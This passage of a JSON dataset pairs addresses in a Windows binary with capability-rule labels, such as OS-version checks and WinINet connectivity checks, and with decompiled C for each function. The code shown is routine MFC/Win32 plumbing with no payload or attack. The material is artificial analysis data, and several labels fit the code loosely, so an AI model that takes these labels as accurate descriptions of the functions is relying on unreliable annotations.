*arg_ch * 0x28 + *(in_ECX + 0xb0);\n                iVar2 = (*_sym.imp.KERNEL32.dll_MulDiv)(arg_8h[1], *(iVar2 + 0x1c), *(iVar2 + 0x18));\n                arg_8h[1] = iVar2;\n                return 1;\n            }\n            *arg_ch = *arg_ch + 1;\n        } while (*arg_ch < *(in_ECX + 0x118));\n    }\n    return 0;\n}\n",
        "token_count": 503
    },
    "0042b4cd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042b4cd(uint noname_0, int32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int32_t *piVar3;\n    uint var_8h;\n    \n    if (arg_ch == 1) {\n        (*_sym.imp.USER32.dll_GetCursorPos)(&var_8h);\n        (*_sym.imp.USER32.dll_ScreenToClient)(*(in_ECX + 0x20), &var_8h);\n        if ((*(in_ECX + 0x10c) == 2) || (iVar2 = fcn.0042b31a(&var_8h, &arg_ch),  iVar2 == 0)) {\n            iVar2 = (*_sym.imp.USER32.dll_LoadCursorA)(0, 0x7f00);\n        }\n        else {\n            piVar3 = in_ECX + 0x120;\n            if (*piVar3 == 0) {\n                iVar2 = fcn.0043026e();\n                iVar2 = (*_sym.imp.USER32.dll_LoadCursorA)(*(iVar2 + 0xc), 0x7902);\n                *piVar3 = iVar2;\n            }\n            iVar2 = *piVar3;\n        }\n        (*_sym.imp.USER32.dll_SetCursor)(iVar2);\n        return 0;\n    }\n    uVar1 = fcn.00418521();\n    return uVar1;\n}\n",
        "token_count": 326
    },
    "0042bd99": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042bd99(uint32_t arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    \n    if (in_ECX[0x43] != 0) {\n        if (((arg_10h == 0) || (iVar1 = fcn.00418b45(0),  iVar1 == 0)) &&\n           (iVar1 = (**(*in_ECX + 0x70))(1),  arg_10h == iVar1)) {\n            (**(*in_ECX + 0x138))((arg_8h & 0xff) << 8 | 0xff, arg_ch, 1);\n        }\n        return;\n    }\n    if (arg_8h == 0) {\n        arg_ch = in_ECX[0x45] - 1;\n    }\n    else if (arg_8h == 1) {\n        arg_ch = in_ECX[0x45] + 1;\n    }\n    else if (arg_8h == 2) {\n        arg_ch = in_ECX[0x45] - ((*(*(*in_ECX[0x4d] + 0x74) + 0x1e) - *(*(*in_ECX[0x4d] + 0x74) + 0x1c)) + 9) / 10;\n    }\n    else if (arg_8h == 3) {\n        arg_ch = ((*(*(*in_ECX[0x4d] + 0x74) + 0x1e) - *(*(*in_ECX[0x4d] + 0x74) + 0x1c)) + 9) / 10 + in_ECX[0x45];\n    }\n    else if (arg_8h != 4) {\n        if (arg_8h == 6) {\n            arg_ch = *(*(*in_ECX[0x4d] + 0x74) + 0x1c);\n        }\n        else {\n            if (arg_8h != 7) {\n                return;\n            }\n            arg_ch = *(*(*in_ECX[0x4d] + 0x74) + 0x1e);\n        }\n    }\n    fcn.0042b3db(arg_ch, 1);\n    return;\n}\n",
        "token_count": 530
    },
    "0042c4d0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042c4d0(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t var_4h;\n    \n    var_4h = in_ECX;\n    iVar1 = fcn.0042b31a(&arg_ch, &var_4h);\n    if (iVar1 != 0) {\n        if (*(in_ECX + 0x10c) == 2) {\n            iVar1 = 0;\n        }\n        else {\n            iVar1 = *(in_ECX + 0x10c) + 1;\n        }\n        fcn.0042c376(iVar1, var_4h, arg_ch, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 179
    },
    "0042e0ef": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042e0ef(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    fcn.004627af(0);\n    iVar1 = fcn.004302e1();\n    if ((*(iVar1 + 0x1c) == 0) && (*(unaff_EBP + 8) != 0)) {\n        uVar2 = fcn.00411567(0x430517);\n        iVar3 = fcn.00411579(0x60);\n        *(unaff_EBP + 8) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = fcn.00432b3c(0x495da4, 0x42e084, 0x42d81f, 4, 2);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x1c) = uVar4;\n        fcn.00411567(uVar2);\n    }\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 314
    },
    "00432be4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00432be4(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t extraout_ECX;\n    int32_t *piVar3;\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    fcn.004627e2(8);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if ((arg_8h_00 != 0) && (iVar1 = fcn.0043290a(arg_8h_00),  iVar1 == 0)) {\n        iVar1 = fcn.0043290a(arg_8h_00);\n        if (iVar1 == 0) {\n            uVar2 = fcn.00411567(0x430517);\n            *(unaff_EBP + -4) = 0;\n            *(unaff_EBP + 8) = uVar2;\n            iVar1 = fcn.00448f7b();\n            if (iVar1 == 0) {\n                fcn.00411e0e();\n            }\n            (**(extraout_ECX + 0x14))(iVar1);\n            piVar3 = fcn.00432abc(arg_8h_00);\n            uVar2 = *(unaff_EBP + 8);\n            *(unaff_EBP + -4) = 0xffffffff;\n            *piVar3 = iVar1;\n            fcn.00411567(uVar2);\n            piVar3 = *(extraout_ECX + 0x58) + iVar1;\n            *piVar3 = arg_8h_00;\n            if (*(extraout_ECX + 0x5c) == 2) {\n                piVar3[1] = arg_8h_00;\n            }\n        }\n        else {\n            piVar3 = *(extraout_ECX + 0x58) + iVar1;\n            *piVar3 = arg_8h_00;\n            if (*(extraout_ECX + 0x5c) == 2) {\n                piVar3[1] = arg_8h_00;\n            }\n        }\n    }\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 512
    },
    "0042e1eb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042e1eb(code **param_1)\n\n{\n    uint uVar1;\n    \n    *param_1 = vtable.CDC.0;\n    if (param_1[1] != NULL) {\n        uVar1 = fcn.0042e1a4();\n        (*_sym.imp.GDI32.dll_DeleteDC)(uVar1);\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "0042e3b6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042e3b6(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    fcn.004627af(0);\n    iVar1 = fcn.004302e1();\n    if ((*(iVar1 + 0x20) == 0) && (*(unaff_EBP + 8) != 0)) {\n        uVar2 = fcn.00411567(0x430517);\n        iVar3 = fcn.00411579(0x60);\n        *(unaff_EBP + 8) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = fcn.00432b3c(0x495e14, 0x42e0a0, 0x42d82d, 4, 1);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x20) = uVar4;\n        fcn.00411567(uVar2);\n    }\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 315
    },
    "0042e48b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042e48b(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 4) == 0) {\n        return 0;\n    }\n    uVar1 = fcn.0042e461();\n    uVar1 = (*_sym.imp.GDI32.dll_DeleteObject)(uVar1);\n    return uVar1;\n}\n",
        "token_count": 89
    },
    "0042f503": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0042f503(int32_t param_1, int32_t param_2)\n\n{\n    if (param_1 != 0) goto code_r0x0042f50e;\n    do {\n        param_1 = fcn.00411e42();\ncode_r0x0042f50e:\n    } while (param_2 == 0);\n    do {\n        if (param_1 == param_2) {\n            return 1;\n        }\n        param_1 = *(param_1 + 0x10);\n    } while (param_1 != 0);\n    return 0;\n}\n",
        "token_count": 139
    },
    "0042f550": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0042f550(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    \n    if (param_2 != 0) {\n        iVar1 = fcn.0042f538(param_1);\n        if (iVar1 != 0) {\n            return param_1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 82
    },
    "0042f5ec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nvoid fcn.0042f5ec(void)\n\n{\n    code *pcVar1;\n    char *pcStack12;\n    \n    if (*0x4bb3cc == 0) {\n        *0x4bb3cc = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if (*0x4bb3cc == 0) {\n            pcStack12 = 0x4b62b8;\n            fcn.0046230a(&pcStack12, 0x4a76e8);\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        pcStack12 = \"CreateActCtxW\";\n        *0x4bb3bc = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x4bb3cc);\n        *0x4bb3c0 = (*pcVar1)(*0x4bb3cc, \"ReleaseActCtx\");\n        *0x4bb3c4 = (*pcVar1)(*0x4bb3cc, \"ActivateActCtx\");\n        *0x4bb3c8 = (*pcVar1)(*0x4bb3cc, \"DeactivateActCtx\");\n    }\n    return;\n}\n",
        "token_count": 276
    },
    "0042f699": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuchar fcn.0042f699(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uchar uVar2;\n    \n    if (param_2 == 0) {\n        fcn.00411e42();\n    }\n    if (*0x4bb3c4 == 0) {\n        uVar2 = 2;\n    }\n    else {\n        iVar1 = fcn.0042f679(param_1, param_2);\n        uVar2 = iVar1 != 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 125
    },
    "0042fb6e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042fb6e(code **param_1)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    \n    *param_1 = vtable.AFX_MODULE_THREAD_STATE.0;\n    if (param_1[0xf] != NULL) {\n        (**(*param_1[0xf] + 0x13c))();\n    }\n    fcn.004115a4(param_1[0x12]);\n    if (param_1[5] != NULL) {\n        (***param_1[5])(1);\n    }\n    if (param_1[6] != NULL) {\n        (***param_1[6])(1);\n    }\n    if (param_1[7] != NULL) {\n        (***param_1[7])(1);\n    }\n    if (param_1[8] != NULL) {\n        (***param_1[8])(1);\n    }\n    if (param_1[9] != NULL) {\n        (***param_1[9])(1);\n    }\n    pcVar2 = param_1[0xe];\n    if (pcVar2 != NULL) {\n        while (*(pcVar2 + 0xc) != 0) {\n            uVar1 = fcn.0043308d();\n            fcn.004115a4(uVar1);\n            pcVar2 = param_1[0xe];\n        }\n    }\n    if (param_1[0xc] != NULL) {\n        (**(*param_1[0xc] + 4))(1);\n    }\n    if (param_1[0xd] != NULL) {\n        (**(*param_1[0xd] + 4))(1);\n    }\n    if (param_1[0xe] != NULL) {\n        (**(*param_1[0xe] + 4))(1);\n    }\n    return;\n}\n",
        "token_count": 408
    },
    "0042fd9a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042fd9a(code **param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t **ppiVar3;\n    \n    *param_1 = vtable.CDllIsolationWrapperBase.0;\n    if (*(param_1 + 2) != '\\0') {\n        (*_sym.imp.KERNEL32.dll_FreeLibrary)(param_1[1]);\n    }\n    ppiVar3 = param_1[3] + -0x10;\n    piVar1 = param_1[3] + -4;\n    LOCK();\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 == 1 || iVar2 + -1 < 0) {\n        (**(**ppiVar3 + 4))(ppiVar3);\n    }\n    return;\n}\n",
        "token_count": 195
    },
    "00430336": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t fcn.00430336(void)\n\n{\n    if (*0x4bb3d8 == 0) {\n        *0x4bb3d8 = 1;\n        (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(0x4bb578);\n    }\n    return *0x4bb3d8;\n}\n",
        "token_count": 74
    },
    "0043039f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0043039f(uint32_t param_1)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    \n    if (0x10 < param_1) {\n        fcn.00411e42();\n    }\n    if (*0x4bb3d8 == 0) {\n        fcn.00430336();\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_EnterCriticalSection;\n    piVar1 = param_1 * 4 + 0x4bb590;\n    if (*piVar1 == 0) {\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x4bb578);\n        if (*piVar1 == 0) {\n            (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(param_1 * 0x18 + 0x4bb3e0);\n            *piVar1 = *piVar1 + 1;\n        }\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x4bb578);\n    }\n    (*pcVar2)(param_1 * 0x18 + 0x4bb3e0);\n    return;\n}\n",
        "token_count": 252
    },
    "004308a3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.004308a3(int32_t param_1)\n\n{\n    if (param_1 != 0) {\n    // WARNING: Could not recover jumptable at 0x004308aa. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.KERNEL32.dll_LocalFree)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "004309eb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.004309eb(int32_t param_1, int32_t param_2)\n\n{\n    int32_t extraout_ECX;\n    \n    if (param_2 == 0) {\n        fcn.00411e42();\n        param_1 = extraout_ECX;\n    }\n    return *(param_1 + 4) + param_2;\n}\n",
        "token_count": 86
    },
    "00430daa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00430daa(uint *arg_8h, int32_t arg_ch)\n\n{\n    uint *puVar1;\n    bool bVar2;\n    uint *in_ECX;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar3 = 1;\n    bVar2 = true;\n    if (1 < arg_8h[2]) {\n        do {\n            if ((arg_ch == 0) || (*(in_ECX[4] + 4 + iVar3 * 8) == arg_ch)) {\n                puVar1 = *(arg_8h[3] + iVar3 * 4);\n                if (puVar1 != NULL) {\n                    (***puVar1)(1);\n                }\n                *(arg_8h[3] + iVar3 * 4) = 0;\n            }\n            else if (*(arg_8h[3] + iVar3 * 4) != 0) {\n                bVar2 = false;\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < arg_8h[2]);\n        if (!bVar2) {\n            return;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(in_ECX + 7);\n    fcn.00430a21(arg_8h);\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(in_ECX + 7);\n    (*_sym.imp.KERNEL32.dll_LocalFree)(arg_8h[3]);\n    (***arg_8h)(1);\n    (*_sym.imp.KERNEL32.dll_TlsSetValue)(*in_ECX, 0);\n    return;\n}\n",
        "token_count": 361
    },
    "00430e3f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00430e3f(uint *param_1, int32_t param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint unaff_retaddr;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(param_1 + 7);\n    if (param_2 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(*param_1);\n        if (iVar2 != 0) {\n            fcn.00430daa(iVar2, unaff_retaddr);\n        }\n    }\n    else {\n        iVar2 = param_1[5];\n        while (iVar2 != 0) {\n            iVar1 = *(iVar2 + 4);\n            fcn.00430daa(iVar2, param_3);\n            iVar2 = iVar1;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(param_1 + 7);\n    return;\n}\n",
        "token_count": 220
    },
    "00430e98": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00430e98(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint arg_ch;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(4);\n    if (*(unaff_EBP + 8) != 0) goto code_r0x00430eb7;\ncode_r0x00430eb2:\n    do {\n        fcn.00411e42();\ncode_r0x00430eb7:\n        if (*extraout_ECX != 0) goto code_r0x00430ef2;\n        if (*0x4bb630 == 0) {\n            *(unaff_EBP + -0x10) = 0x4bb634;\n            *(unaff_EBP + -4) = 0;\n            *0x4bb630 = fcn.00430bbd();\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*0x4bb630 == 0) goto code_r0x00430eb2;\n        }\n        iVar1 = fcn.00430a87();\n        *extraout_ECX = iVar1;\n        if (iVar1 != 0) {\ncode_r0x00430ef2:\n            iVar1 = fcn.004308b4(*extraout_ECX);\n            if (iVar1 == 0) {\n                arg_ch = (**(unaff_EBP + 8))();\n                fcn.00430c5f(*extraout_ECX, arg_ch);\n            }\n            fcn.00462887();\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 391
    },
    "004310b4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004310b4(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint16_t *puVar3;\n    uint16_t uVar4;\n    int16_t iVar5;\n    bool bVar6;\n    \n    bVar6 = *(arg_8h + 2) == -1;\n    iVar1 = fcn.00431069(arg_8h);\n    iVar2 = fcn.00430ffd(arg_8h);\n    if (iVar2 != 0) {\n        iVar1 = iVar1 + (bVar6 * 2 + 1) * 2;\n        iVar2 = fcn.00462a96(iVar1);\n        iVar1 = iVar1 + 2 + iVar2 * 2;\n    }\n    if (bVar6) {\n        iVar5 = *(arg_8h + 0x10);\n    }\n    else {\n        iVar5 = *(arg_8h + 8);\n    }\n    if (iVar5 != 0) {\n        do {\n            puVar3 = (iVar1 + 3U & 0xfffffffc) + (-bVar6 & 6) + 0x12;\n            if (*puVar3 == 0xffff) {\n                puVar3 = puVar3 + 2;\n            }\n            else {\n                do {\n                    uVar4 = *puVar3;\n                    puVar3 = puVar3 + 1;\n                } while (uVar4 != 0);\n            }\n            if (*puVar3 == 0xffff) {\n                puVar3 = puVar3 + 2;\n            }\n            else {\n                do {\n                    uVar4 = *puVar3;\n                    puVar3 = puVar3 + 1;\n                } while (uVar4 != 0);\n            }\n            uVar4 = *puVar3;\n            if ((uVar4 != 0) && (!bVar6)) {\n                uVar4 = uVar4 - 2;\n            }\n            iVar5 = iVar5 + -1;\n            iVar1 = puVar3 + uVar4 + 2;\n        } while (iVar5 != 0);\n    }\n    return iVar1 - arg_8h;\n}\n",
        "token_count": 492
    },
    "004313b9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_58h\n\nvoid __cdecl fcn.004313b9(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    ushort *puVar5;\n    uint32_t uVar6;\n    uint *in_ECX;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int16_t iVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    bool bVar12;\n    ulong uVar13;\n    int32_t var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint lpString;\n    uint var_44h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4b8030 ^ &stack0xfffffffc;\n    if (in_ECX[1] != 0) {\n        puVar2 = (*_sym.imp.KERNEL32.dll_GlobalLock)(*in_ECX);\n        bVar12 = *(puVar2 + 2) == -1;\n        iVar3 = fcn.00430ffd(puVar2);\n        iVar1 = bVar12 * 2 + 1;\n        var_58h = iVar1 * 2;\n        if (bVar12) {\n            puVar2[3] = puVar2[3] | 0x40;\n        }\n        else {\n            *puVar2 = *puVar2 | 0x40;\n        }\n        iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(arg_8h);\n        if (iVar4 < 0x20) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, arg_8h, 0xffffffff, &var_44h, 0x20);\n            iVar4 = var_58h + iVar4 * 2;\n            if (var_58h <= iVar4) {\n                uVar13 = fcn.00431069(puVar2);\n                puVar5 = uVar13;\n                iVar7 = 0;\n                iVar10 = uVar13 >> 0x20;\n                if (iVar3 != 0) {\n                    iVar3 = fcn.00462a96(puVar5 + iVar1);\n                    iVar7 = var_58h + 2 + iVar3 * 2;\n                    iVar10 = iVar4;\n                }\n                uVar6 = iVar7 + 3 + puVar5 & 0xfffffffc;\n                uVar11 = puVar5 + iVar10 + 3 & 0xfffffffc;\n                if (bVar12) {\n                    iVar9 = *(puVar2 + 4);\n                }\n                else {\n                    iVar9 = *(puVar2 + 2);\n                }\n                if ((iVar4 != iVar7) && (iVar9 != 0)) {\n                    uVar8 = (in_ECX[1] - uVar6) + puVar2;\n                    if (in_ECX[1] < uVar8) goto code_r0x004314f9;\n                    fcn.00429a2a(uVar11, uVar8, uVar6, uVar8);\n                }\n                *puVar5 = arg_ch;\n                iVar4 = iVar4 + iVar1 * -2;\n                fcn.00429a2a(puVar5 + iVar1, iVar4, &var_44h, iVar4);\n                in_ECX[1] = in_ECX[1] + (uVar11 - uVar6);\n                (*_sym.imp.KERNEL32.dll_GlobalUnlock)(*in_ECX);\n                in_ECX[2] = 0;\n            }\n        }\n    }\ncode_r0x004314f9:\n    fcn.0045e747(var_58h);\n    return;\n}\n",
        "token_count": 863
    },
    "00431508": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
